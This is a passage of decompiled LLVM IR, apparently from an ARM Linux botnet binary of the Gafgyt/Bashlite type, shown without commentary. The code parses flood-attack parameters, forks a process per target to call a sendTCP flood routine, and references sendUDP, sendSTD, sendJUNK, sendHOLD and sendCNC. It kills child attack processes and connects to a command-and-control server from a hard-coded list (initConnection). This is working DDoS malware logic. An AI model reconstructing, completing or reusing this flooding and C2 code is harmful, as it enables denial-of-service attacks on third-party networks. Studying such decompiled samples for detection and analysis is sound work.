  %v4_128e0 = call i32 @__GI_strcoll(i8* %v3_128e0, i32 ptrtoint ([4 x i8]* @global_var_245d0.1250 to i32))
  %v2_128e8 = icmp eq i32 %v4_128e0, 0
  br i1 %v2_128e8, label %dec_label_pc_128f0, label %dec_label_pc_12c1c

dec_label_pc_128f0:                               ; preds = %dec_label_pc_128d0
  %v7_128f8 = icmp slt i32 %arg1, 6
  br i1 %v7_128f8, label %dec_label_pc_12d5c, label %dec_label_pc_128fc

dec_label_pc_128fc:                               ; preds = %dec_label_pc_128f0
  %v1_12900 = add i32 %tmp, 12
  %v1_12904 = inttoptr i32 %v1_12900 to i32*
  %v2_12904 = load i32, i32* %v1_12904, align 4
  store i32 %v2_12904, i32* @r0, align 4
  %v1_1290c = call i32 @atol(i32 %v2_12904)
  %v7_12914 = icmp eq i32 %v1_1290c, -1
  br i1 %v7_12914, label %dec_label_pc_12d5c, label %dec_label_pc_1291c

dec_label_pc_1291c:                               ; preds = %dec_label_pc_128fc
  %v1_12920 = add i32 %tmp, 8
  %v1_12924 = inttoptr i32 %v1_12920 to i32*
  %v2_12924 = load i32, i32* %v1_12924, align 4
  store i32 %v2_12924, i32* @r0, align 4
  %v1_1292c = call i32 @atol(i32 %v2_12924)
  %v7_12934 = icmp eq i32 %v1_1292c, -1
  br i1 %v7_12934, label %dec_label_pc_12d5c, label %dec_label_pc_1293c

dec_label_pc_1293c:                               ; preds = %dec_label_pc_1291c
  %v1_12940 = add i32 %tmp, 16
  %v1_12944 = inttoptr i32 %v1_12940 to i32*
  %v2_12944 = load i32, i32* %v1_12944, align 4
  store i32 %v2_12944, i32* @r0, align 4
  %v1_1294c = call i32 @atol(i32 %v2_12944)
  %v7_12954 = icmp eq i32 %v1_1294c, -1
  br i1 %v7_12954, label %dec_label_pc_12d5c, label %dec_label_pc_1295c

dec_label_pc_1295c:                               ; preds = %dec_label_pc_1293c
  %v2_12964 = load i32, i32* %v1_12944, align 4
  store i32 %v2_12964, i32* @r0, align 4
  %v1_1296c = call i32 @atol(i32 %v2_12964)
  %v8_12978 = icmp sgt i32 %v1_1296c, 32
  br i1 %v8_12978, label %dec_label_pc_12d5c, label %dec_label_pc_1297c

dec_label_pc_1297c:                               ; preds = %dec_label_pc_1295c
  %v7_12984 = icmp slt i32 %arg1, 7
  br i1 %v7_12984, label %dec_label_pc_129a8, label %dec_label_pc_12988

dec_label_pc_12988:                               ; preds = %dec_label_pc_1297c
  %v1_1298c = add i32 %tmp, 24
  %v1_12990 = inttoptr i32 %v1_1298c to i32*
  %v2_12990 = load i32, i32* %v1_12990, align 4
  store i32 %v2_12990, i32* @r0, align 4
  %v1_12998 = call i32 @atol(i32 %v2_12990)
  %v1_129a0 = icmp slt i32 %v1_12998, 0
  br i1 %v1_129a0, label %dec_label_pc_12d5c, label %dec_label_pc_129a8

dec_label_pc_129a8:                               ; preds = %dec_label_pc_12988, %dec_label_pc_1297c
  %v7_129ac = icmp eq i32 %arg1, 8
  br i1 %v7_129ac, label %dec_label_pc_129b4, label %dec_label_pc_12a54

dec_label_pc_129b4:                               ; preds = %dec_label_pc_129a8
  %v1_129b8 = add i32 %tmp, 28
  %v1_129bc = inttoptr i32 %v1_129b8 to i32*
  %v2_129bc = load i32, i32* %v1_129bc, align 4
  store i32 %v2_129bc, i32* @r0, align 4
  %v1_129c4 = call i32 @atol(i32 %v2_129bc)
  %v5_129d0 = icmp sgt i32 %v1_129c4, 0
  br i1 %v5_129d0, label %dec_label_pc_12a54, label %dec_label_pc_12d5c

dec_label_pc_12a54:                               ; preds = %dec_label_pc_129a8, %dec_label_pc_129b4
  %v1_12a58 = add i32 %tmp, 4
  %v1_12a5c = inttoptr i32 %v1_12a58 to i32*
  %v2_12a5c = load i32, i32* %v1_12a5c, align 4
  %v2_12a6c = load i32, i32* %v1_12924, align 4
  store i32 %v2_12a6c, i32* @r0, align 4
  %v1_12a74 = call i32 @atol(i32 %v2_12a6c)
  %v2_12a88 = load i32, i32* %v1_12904, align 4
  store i32 %v2_12a88, i32* @r0, align 4
  %v1_12a90 = call i32 @atol(i32 %v2_12a88)
  %v2_12aa4 = load i32, i32* %v1_12944, align 4
  store i32 %v2_12aa4, i32* @r0, align 4
  %v1_12aac = call i32 @atol(i32 %v2_12aa4)
  %v1_12abc = add i32 %tmp, 20
  %v1_12ac0 = inttoptr i32 %v1_12abc to i32*
  %v2_12ac0 = load i32, i32* %v1_12ac0, align 4
  br i1 %v7_129ac, label %dec_label_pc_12ad4, label %dec_label_pc_12af0

dec_label_pc_12ad4:                               ; preds = %dec_label_pc_12a54
  %v1_12ad8 = add i32 %tmp, 28
  %v1_12adc = inttoptr i32 %v1_12ad8 to i32*
  %v2_12adc = load i32, i32* %v1_12adc, align 4
  store i32 %v2_12adc, i32* @r0, align 4
  %v1_12ae4 = call i32 @atol(i32 %v2_12adc)
  br label %dec_label_pc_12af8

dec_label_pc_12af0:                               ; preds = %dec_label_pc_12a54
  br label %dec_label_pc_12af8

dec_label_pc_12af8:                               ; preds = %dec_label_pc_12ad4, %dec_label_pc_12af0
  %storemerge3 = phi i32 [ 10, %dec_label_pc_12af0 ], [ %v1_12ae4, %dec_label_pc_12ad4 ]
  br i1 %v7_12984, label %dec_label_pc_12b28, label %dec_label_pc_12b0c

dec_label_pc_12b0c:                               ; preds = %dec_label_pc_12af8
  %v1_12b10 = add i32 %tmp, 24
  %v1_12b14 = inttoptr i32 %v1_12b10 to i32*
  %v2_12b14 = load i32, i32* %v1_12b14, align 4
  store i32 %v2_12b14, i32* @r0, align 4
  %v1_12b1c = call i32 @atol(i32 %v2_12b14)
  br label %dec_label_pc_12b30

dec_label_pc_12b28:                               ; preds = %dec_label_pc_12af8
  br label %dec_label_pc_12b30

dec_label_pc_12b30:                               ; preds = %dec_label_pc_12b0c, %dec_label_pc_12b28
  %storemerge2 = phi i32 [ 0, %dec_label_pc_12b28 ], [ %v1_12b1c, %dec_label_pc_12b0c ]
  store i32 %v2_12a5c, i32* @r0, align 4
  %v2_12b44 = call i32 @__GI_strchr(i32 %v2_12a5c, i32 44)
  store i32 %v2_12b44, i32* @r0, align 4
  %v2_12b4c = icmp eq i32 %v2_12b44, 0
  br i1 %v2_12b4c, label %dec_label_pc_12bd8, label %dec_label_pc_12b54

dec_label_pc_12b54:                               ; preds = %dec_label_pc_12b30
  %v2_12b60 = call i32 @__GI_strtok(i32 %v2_12a5c, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_12b60, i32* @r0, align 4
  %v2_12bcc30 = icmp eq i32 %v2_12b60, 0
  br i1 %v2_12bcc30, label %dec_label_pc_12c1c, label %dec_label_pc_12b70

dec_label_pc_12b70:                               ; preds = %dec_label_pc_12b54, %dec_label_pc_12bb4
  %storemerge1431 = phi i32 [ %v2_12bbc, %dec_label_pc_12bb4 ], [ %v2_12b60, %dec_label_pc_12b54 ]
  %v0_12b70 = call i32 @listFork()
  %v2_12b78 = icmp eq i32 %v0_12b70, 0
  br i1 %v2_12b78, label %dec_label_pc_12b80, label %dec_label_pc_12bb4

dec_label_pc_12b80:                               ; preds = %dec_label_pc_12b70
  %v7_12ba8 = call i32 @sendTCP(i32 %storemerge1431, i32 %v1_12a74, i32 %v1_12a90, i32 %v1_12aac, i32 %v2_12ac0, i32 %storemerge2, i32 %storemerge3)
  %v1_12bb0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12bb4

dec_label_pc_12bb4:                               ; preds = %dec_label_pc_12b70, %dec_label_pc_12b80
  %v2_12bbc = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_244dc.1188 to i32))
  store i32 %v2_12bbc, i32* @r0, align 4
  %v2_12bcc = icmp eq i32 %v2_12bbc, 0
  br i1 %v2_12bcc, label %dec_label_pc_12c1c, label %dec_label_pc_12b70

dec_label_pc_12bd8:                               ; preds = %dec_label_pc_12b30
  %v0_12bd8 = call i32 @listFork()
  %v2_12be0 = icmp eq i32 %v0_12bd8, 0
  br i1 %v2_12be0, label %dec_label_pc_12be8, label %dec_label_pc_12d5c

dec_label_pc_12be8:                               ; preds = %dec_label_pc_12bd8
  %v7_12c10 = call i32 @sendTCP(i32 %v2_12a5c, i32 %v1_12a74, i32 %v1_12a90, i32 %v1_12aac, i32 %v2_12ac0, i32 %storemerge2, i32 %storemerge3)
  %v1_12c18 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_12c1c

dec_label_pc_12c1c:                               ; preds = %dec_label_pc_12bb4, %dec_label_pc_12b54, %dec_label_pc_128d0, %dec_label_pc_12be8
  %v2_12c20 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_245d4.1252 to i32), i32* @r1, align 4
  %v3_12c2c = inttoptr i32 %v2_12c20 to i8*
  %v4_12c2c = call i32 @__GI_strcoll(i8* %v3_12c2c, i32 ptrtoint ([5 x i8]* @global_var_245d4.1252 to i32))
  store i32 %v4_12c2c, i32* @r0, align 4
  %v2_12c34 = icmp eq i32 %v4_12c2c, 0
  br i1 %v2_12c34, label %dec_label_pc_12c3c, label %dec_label_pc_12d34

dec_label_pc_12c3c:                               ; preds = %dec_label_pc_12c1c
  br label %dec_label_pc_12ce0

dec_label_pc_12c50:                               ; preds = %dec_label_pc_12ce0, %dec_label_pc_12d14
  %v3_12c54 = mul i32 %storemerge12, 4
  %v2_12c60 = load i32, i32* @global_var_34748.62, align 4
  %v2_12c64 = add i32 %v2_12c60, %v3_12c54
  %v1_12c68 = inttoptr i32 %v2_12c64 to i32*
  %v2_12c68 = load i32, i32* %v1_12c68, align 4
  %v2_12c6c = icmp eq i32 %v2_12c68, 0
  br i1 %v2_12c6c, label %dec_label_pc_12cd4, label %dec_label_pc_12c74

dec_label_pc_12c74:                               ; preds = %dec_label_pc_12c50
  %v2_12c8c = load i32, i32* %v1_12c68, align 4
  %v0_12c90 = call i32 @__GI_getpid()
  store i32 %v0_12c90, i32* @r0, align 4
  %v9_12c98 = icmp eq i32 %v2_12c8c, %v0_12c90
  br i1 %v9_12c98, label %dec_label_pc_12cd4, label %dec_label_pc_12ca0

dec_label_pc_12ca0:                               ; preds = %dec_label_pc_12c74
  %v2_12cb0 = load i32, i32* @global_var_34748.62, align 4
  %v2_12cb4 = add i32 %v2_12cb0, %v3_12c54
  %v1_12cb8 = inttoptr i32 %v2_12cb4 to i32*
  %v2_12cb8 = load i32, i32* %v1_12cb8, align 4
  %v2_12cc4 = call i32 @kill(i32 %v2_12cb8, i32 9)
  store i32 %v2_12cc4, i32* @r0, align 4
  %v1_12ccc = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_12cd4

dec_label_pc_12cd4:                               ; preds = %dec_label_pc_12c74, %dec_label_pc_12c50, %dec_label_pc_12ca0
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.1, %dec_label_pc_12c50 ], [ %stack_var_-48.1, %dec_label_pc_12c74 ], [ %v1_12ccc, %dec_label_pc_12ca0 ]
  %v1_12cd8 = add i32 %storemerge12, 1
  br label %dec_label_pc_12ce0

dec_label_pc_12ce0:                               ; preds = %dec_label_pc_12c3c, %dec_label_pc_12cd4
  %stack_var_-48.1 = phi i32 [ 0, %dec_label_pc_12c3c ], [ %stack_var_-48.0, %dec_label_pc_12cd4 ]
  %storemerge12 = phi i32 [ 0, %dec_label_pc_12c3c ], [ %v1_12cd8, %dec_label_pc_12cd4 ]
  %v5_12cf8 = load i32, i32* @global_var_2e4ec.60, align 4
  %v9_12d0c = icmp eq i32 %v5_12cf8, 0
  br i1 %v9_12d0c, label %dec_label_pc_12d14, label %dec_label_pc_12c50

dec_label_pc_12d14:                               ; preds = %dec_label_pc_12ce0
  %v2_12cf8 = load i32, i32* @global_var_2e4e8.59, align 4
  %tmp119 = icmp ugt i32 %v2_12cf8, %storemerge12
  br i1 %tmp119, label %dec_label_pc_12c50, label %dec_label_pc_12d34

dec_label_pc_12d34:                               ; preds = %dec_label_pc_12d14, %dec_label_pc_12c1c
  %v2_12d38 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_245dc.1256 to i32), i32* @r1, align 4
  %v3_12d44 = inttoptr i32 %v2_12d38 to i8*
  %v4_12d44 = call i32 @__GI_strcoll(i8* %v3_12d44, i32 ptrtoint ([12 x i8]* @global_var_245dc.1256 to i32))
  %v2_12d4c = icmp eq i32 %v4_12d44, 0
  br i1 %v2_12d4c, label %dec_label_pc_12d54, label %dec_label_pc_12d5c

dec_label_pc_12d54:                               ; preds = %dec_label_pc_12d34
  %v1_12d58 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_12d5c

dec_label_pc_12d5c:                               ; preds = %dec_label_pc_129b4, %dec_label_pc_127b8, %dec_label_pc_12604, %dec_label_pc_12490, %dec_label_pc_1209c, %dec_label_pc_11e74, %dec_label_pc_11d10, %dec_label_pc_11e00, %dec_label_pc_11f74, %dec_label_pc_12210, %dec_label_pc_12394, %dec_label_pc_12590, %dec_label_pc_12724, %dec_label_pc_128a8, %dec_label_pc_12bd8, %dec_label_pc_12d34, %dec_label_pc_11c74, %dec_label_pc_11c04, %dec_label_pc_12988, %dec_label_pc_1295c, %dec_label_pc_1293c, %dec_label_pc_1291c, %dec_label_pc_128fc, %dec_label_pc_128f0, %dec_label_pc_12798, %dec_label_pc_1278c, %dec_label_pc_125e4, %dec_label_pc_125d8, %dec_label_pc_12470, %dec_label_pc_12464, %dec_label_pc_1226c, %dec_label_pc_12070, %dec_label_pc_12048, %dec_label_pc_12028, %dec_label_pc_12008, %dec_label_pc_11fe8, %dec_label_pc_11fc8, %dec_label_pc_11fbc, %dec_label_pc_11e54, %dec_label_pc_11e48, %dec_label_pc_11cf0, %dec_label_pc_11ce4, %dec_label_pc_11b9c, %dec_label_pc_11c2c, %dec_label_pc_11b60, %dec_label_pc_11a64, %dec_label_pc_11a2c, %dec_label_pc_12d54
  %v1_12d64 = phi i32 [ %v1_129c4, %dec_label_pc_129b4 ], [ %v1_127c8, %dec_label_pc_127b8 ], [ %v1_12614, %dec_label_pc_12604 ], [ %v1_124a0, %dec_label_pc_12490 ], [ %v1_120ac, %dec_label_pc_1209c ], [ %v1_11e84, %dec_label_pc_11e74 ], [ %v1_11d20, %dec_label_pc_11d10 ], [ %v0_11e00, %dec_label_pc_11e00 ], [ %v0_11f74, %dec_label_pc_11f74 ], [ %v0_12210, %dec_label_pc_12210 ], [ %v0_12394, %dec_label_pc_12394 ], [ %v0_12590, %dec_label_pc_12590 ], [ %v0_12724, %dec_label_pc_12724 ], [ %v0_128a8, %dec_label_pc_128a8 ], [ %v0_12bd8, %dec_label_pc_12bd8 ], [ %v4_12d44, %dec_label_pc_12d34 ], [ 0, %dec_label_pc_11c74 ], [ 0, %dec_label_pc_11c04 ], [ %v1_12998, %dec_label_pc_12988 ], [ %v1_1296c, %dec_label_pc_1295c ], [ %v1_1294c, %dec_label_pc_1293c ], [ %v1_1292c, %dec_label_pc_1291c ], [ %v1_1290c, %dec_label_pc_128fc ], [ 0, %dec_label_pc_128f0 ], [ %v1_127a8, %dec_label_pc_12798 ], [ 0, %dec_label_pc_1278c ], [ %v1_125f4, %dec_label_pc_125e4 ], [ 0, %dec_label_pc_125d8 ], [ %v1_12480, %dec_label_pc_12470 ], [ 0, %dec_label_pc_12464 ], [ 0, %dec_label_pc_1226c ], [ %v1_12080, %dec_label_pc_12070 ], [ %v1_12058, %dec_label_pc_12048 ], [ %v1_12038, %dec_label_pc_12028 ], [ %v1_12018, %dec_label_pc_12008 ], [ %v1_11ff8, %dec_label_pc_11fe8 ], [ %v1_11fd8, %dec_label_pc_11fc8 ], [ 0, %dec_label_pc_11fbc ], [ %v1_11e64, %dec_label_pc_11e54 ], [ 0, %dec_label_pc_11e48 ], [ %v1_11d00, %dec_label_pc_11cf0 ], [ 0, %dec_label_pc_11ce4 ], [ 0, %dec_label_pc_11b9c ], [ %v0_11c14, %dec_label_pc_11c2c ], [ %v3_11b70, %dec_label_pc_11b60 ], [ %v3_11a88, %dec_label_pc_11a64 ], [ %v3_11a3c, %dec_label_pc_11a2c ], [ %v1_12d58, %dec_label_pc_12d54 ]
  store i32 %v3_119f8, i32* @r4, align 4
  store i32 %v6_119f8, i32* @r5, align 4
  store i32 %v9_119f8, i32* @r6, align 4
  store i32 %v12_119f8, i32* @r7, align 4
  store i32 %v15_119f8, i32* @r8, align 4
  store i32 %v18_119f8, i32* @fp, align 4
  ret i32 %v1_12d64

; uselistorder directives
  uselistorder i32 %stack_var_-48.1, { 0, 2, 1 }
  uselistorder i32 %v3_12c54, { 1, 0 }
  uselistorder i32 %v2_12bbc, { 2, 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v1_12aac, { 1, 0 }
  uselistorder i32 %v1_12a90, { 1, 0 }
  uselistorder i32 %v1_12a74, { 1, 0 }
  uselistorder i32 %v2_12a5c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1294c, { 1, 0 }
  uselistorder i32 %v1_1292c, { 1, 0 }
  uselistorder i32 %v1_1290c, { 1, 0 }
  uselistorder i32 %v2_1288c, { 2, 1, 0 }
  uselistorder i32 %v1_12818, { 1, 0 }
  uselistorder i32 %v1_127fc, { 1, 0 }
  uselistorder i32 %v2_127e4, { 1, 0, 3, 2 }
  uselistorder i32 %v2_12708, { 2, 1, 0 }
  uselistorder i32 %storemerge1837, { 2, 1, 0 }
  uselistorder i32 %v1_12664, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v1_12648, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_12630, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v2_12574, { 2, 1, 0 }
  uselistorder i32 %v1_124f0, { 1, 0 }
  uselistorder i32 %v1_124d4, { 1, 0 }
  uselistorder i32 %v2_124bc, { 1, 0, 3, 2 }
  uselistorder i32 %v2_12378, { 1, 0 }
  uselistorder i32* %v1_12280, { 2, 0, 1, 3 }
  uselistorder i32 %v2_121f4, { 2, 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %v1_12118, { 1, 0 }
  uselistorder i32 %v1_120fc, { 1, 0 }
  uselistorder i32 %v1_120e0, { 1, 0 }
  uselistorder i32 %v2_120c8, { 1, 0, 3, 2 }
  uselistorder i32 %v1_12038, { 1, 0 }
  uselistorder i32 %v1_12018, { 1, 0 }
  uselistorder i32 %v1_11ff8, { 1, 0 }
  uselistorder i32 %v1_11fd8, { 1, 0 }
  uselistorder i32 %v2_11f58, { 2, 1, 0 }
  uselistorder i32 %v1_11ed4, { 1, 0 }
  uselistorder i32 %v1_11eb8, { 1, 0 }
  uselistorder i32 %v2_11ea0, { 1, 0, 3, 2 }
  uselistorder i32 %v2_11de4, { 2, 1, 0 }
  uselistorder i32 %v1_11d70, { 1, 0 }
  uselistorder i32 %v1_11d54, { 1, 0 }
  uselistorder i32 %v2_11d3c, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 6, 7, 8, 9, 10, 5, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 1, 2, 3, 4, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendJUNK, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_244dc.1188 to i32), { 7, 8, 6, 9, 5, 10, 4, 11, 3, 12, 2, 13, 1, 14, 0, 15, 16, 17 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_2457c.1229 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_34744.1225, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1ffd0.55 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_12d5c, { 47, 15, 14, 0, 18, 19, 20, 21, 22, 23, 13, 1, 24, 25, 12, 2, 26, 27, 11, 3, 28, 29, 10, 30, 9, 4, 31, 32, 33, 34, 35, 36, 37, 8, 5, 38, 39, 7, 6, 40, 41, 16, 43, 17, 42, 44, 45, 46 }
  uselistorder label %dec_label_pc_12ce0, { 1, 0 }
  uselistorder label %dec_label_pc_12cd4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12c50, { 1, 0 }
  uselistorder label %dec_label_pc_12c1c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12bb4, { 1, 0 }
  uselistorder label %dec_label_pc_12b70, { 1, 0 }
  uselistorder label %dec_label_pc_12b30, { 1, 0 }
  uselistorder label %dec_label_pc_12af8, { 1, 0 }
  uselistorder label %dec_label_pc_12a54, { 1, 0 }
  uselistorder label %dec_label_pc_128d0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12884, { 1, 0 }
  uselistorder label %dec_label_pc_1285c, { 1, 0 }
  uselistorder label %dec_label_pc_1276c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12700, { 1, 0 }
  uselistorder label %dec_label_pc_126a8, { 1, 0 }
  uselistorder label %dec_label_pc_125b8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1256c, { 1, 0 }
  uselistorder label %dec_label_pc_12534, { 1, 0 }
  uselistorder label %dec_label_pc_12444, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12370, { 1, 0 }
  uselistorder label %dec_label_pc_122c0, { 1, 0 }
  uselistorder label %dec_label_pc_1224c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_121ec, { 1, 0 }
  uselistorder label %dec_label_pc_121b0, { 1, 0 }
  uselistorder label %dec_label_pc_12170, { 1, 0 }
  uselistorder label %dec_label_pc_120c0, { 1, 0 }
  uselistorder label %dec_label_pc_11f9c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11f50, { 1, 0 }
  uselistorder label %dec_label_pc_11f18, { 1, 0 }
  uselistorder label %dec_label_pc_11e28, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11ddc, { 1, 0 }
  uselistorder label %dec_label_pc_11db4, { 1, 0 }
  uselistorder label %dec_label_pc_11cc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11be0, { 1, 0 }
  uselistorder label %dec_label_pc_11b34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ae4, { 2, 0, 1 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_12d6c = load i32, i32* @fp, align 4
  store i32 77172, i32* %stack_var_-4, align 4
  %v2_12d70 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12d70, i32* @fp, align 4
  %v2_12d84 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_12d94 = bitcast i32* %stack_var_-4116 to i8*
  %v3_12d94 = call i32 @__GI_memset(i8* %v2_12d94, i32 0)
  %v2_12d9c = load i32, i32* @global_var_2e4e0.53, align 4
  %v2_12da0 = icmp eq i32 %v2_12d9c, 0
  br i1 %v2_12da0, label %dec_label_pc_12dc4, label %dec_label_pc_12da8

dec_label_pc_12da8:                               ; preds = %entry
  %v1_12db4 = call i32 @__GI_close(i32 %v2_12d9c)
  store i32 0, i32* @global_var_2e4e0.53, align 4
  br label %dec_label_pc_12dc4

dec_label_pc_12dc4:                               ; preds = %entry, %dec_label_pc_12da8
  %v2_12dc8 = load i32, i32* @global_var_2e1e0.1259, align 4
  %v2_12dcc = icmp eq i32 %v2_12dc8, 0
  br i1 %v2_12dcc, label %dec_label_pc_12df8, label %dec_label_pc_12de4

dec_label_pc_12de4:                               ; preds = %dec_label_pc_12dc4
  %v1_12dec = add i32 %v2_12dc8, 1
  br label %dec_label_pc_12df8

dec_label_pc_12df8:                               ; preds = %dec_label_pc_12dc4, %dec_label_pc_12de4
  %storemerge1 = phi i32 [ %v1_12dec, %dec_label_pc_12de4 ], [ 0, %dec_label_pc_12dc4 ]
  store i32 %storemerge1, i32* @global_var_2e1e0.1259, align 4
  %v4_12e10 = mul i32 %storemerge1, 4
  %v5_12e10 = add i32 %v4_12e10, ptrtoint ([15 x i8]** @global_var_2e0ac.1262 to i32)
  %v6_12e10 = inttoptr i32 %v5_12e10 to i32*
  %v7_12e10 = load i32, i32* %v6_12e10, align 4
  store i32 %v7_12e10, i32* @r1, align 4
  %v3_12e1c = call i32 @strcpy(i8* %v2_12d94, i32 %v7_12e10)
  %v2_12e24 = load i32, i32* @global_var_2e0b0.1264, align 4
  store i32 %v2_12d84, i32* @r0, align 4
  %v2_12e40 = call i32 @__GI_strchr(i32 %v2_12d84, i32 58)
  %v2_12e48 = icmp eq i32 %v2_12e40, 0
  br i1 %v2_12e48, label %dec_label_pc_12ea8, label %dec_label_pc_12e50

dec_label_pc_12e50:                               ; preds = %dec_label_pc_12df8
  store i32 %v2_12d84, i32* @r0, align 4
  %v2_12e64 = call i32 @__GI_strchr(i32 %v2_12d84, i32 58)
  %v1_12e6c = add i32 %v2_12e64, 1
  store i32 %v1_12e6c, i32* @r0, align 4
  %v1_12e74 = call i32 @atol(i32 %v1_12e6c)
  store i32 %v2_12d84, i32* @r0, align 4
  %v2_12e94 = call i32 @__GI_strchr(i32 %v2_12d84, i32 58)
  %v3_12ea4 = inttoptr i32 %v2_12e94 to i8*
  store i8 0, i8* %v3_12ea4, align 1
  br label %dec_label_pc_12ea8

dec_label_pc_12ea8:                               ; preds = %dec_label_pc_12df8, %dec_label_pc_12e50
  %stack_var_-20.0 = phi i32 [ %v2_12e24, %dec_label_pc_12df8 ], [ %v1_12e74, %dec_label_pc_12e50 ]
  %v3_12eb4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_12eb4, i32* @global_var_2e4e0.53, align 4
  %v4_12ee8 = call i32 @connectTimeout(i32 %v3_12eb4, i32 %v2_12d84, i32 %stack_var_-20.0, i32 30)
  %v2_12ef0 = icmp eq i32 %v4_12ee8, 0
  %. = zext i1 %v2_12ef0 to i32
  store i32 %v3_12d6c, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_12d84, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_12ea8, { 1, 0 }
  uselistorder label %dec_label_pc_12df8, { 1, 0 }
  uselistorder label %dec_label_pc_12dc4, { 1, 0 }
}

define i32 @getOurIP(i32 %arg1) local_unnamed_addr {
entry:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12f40 = load i32, i32* @fp, align 4
  store i32 %v3_12f40, i32* %stack_var_-16, align 4
  %v3_12f5c = call i32 @socket(i32 2, i32 2, i32 0)
  %v3_12f6c = icmp eq i32 %v3_12f5c, -1
  br i1 %v3_12f6c, label %dec_label_pc_12f74, label %dec_label_pc_12f84

dec_label_pc_12f74:                               ; preds = %entry
  br label %dec_label_pc_131c0

dec_label_pc_12f84:                               ; preds = %entry
  %v2_12f84 = ptrtoint i32* %stack_var_-52 to i32
  store i32 16, i32* @r2, align 4
  %v2_12f94 = bitcast i32* %stack_var_-52 to i8*
  %v3_12f94 = call i32 @__GI_memset(i8* %v2_12f94, i32 0)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_245e8.1266 to i32), i32* @r0, align 4
  %v2_12fa4 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_245e8.1266 to i32))
  %v1_12fb4 = call i32 @__GI_htons(i32 53)
  %v3_12fd0 = call i32 @__libc_connect(i32 %v3_12f5c, i32 %v2_12f84, i32 16)
  %v3_12fe0 = icmp eq i32 %v3_12fd0, -1
  br i1 %v3_12fe0, label %dec_label_pc_12fe8, label %dec_label_pc_12ff8

dec_label_pc_12fe8:                               ; preds = %dec_label_pc_12f84
  br label %dec_label_pc_131c0

dec_label_pc_12ff8:                               ; preds = %dec_label_pc_12f84
  store i32 16, i32* %stack_var_-72, align 4
  %v2_13000 = ptrtoint i32* %stack_var_-68 to i32
  %v2_13004 = ptrtoint i32* %stack_var_-72 to i32
  %v5_13010 = call i32 @__GI_getsockname(i32 %v3_12f5c, i32 %v2_13000, i32 %v2_13004, i32 %v2_13000, i32 16)
  %v3_13020 = icmp eq i32 %v5_13010, -1
  br i1 %v3_13020, label %dec_label_pc_13028, label %dec_label_pc_13038

dec_label_pc_13028:                               ; preds = %dec_label_pc_12ff8
  br label %dec_label_pc_131c0

dec_label_pc_13038:                               ; preds = %dec_label_pc_12ff8
  store i32 %tmp19, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_3473c.481 to i32), i32* @r2, align 4
  store i32 %tmp19, i32* @global_var_3473c.481, align 4
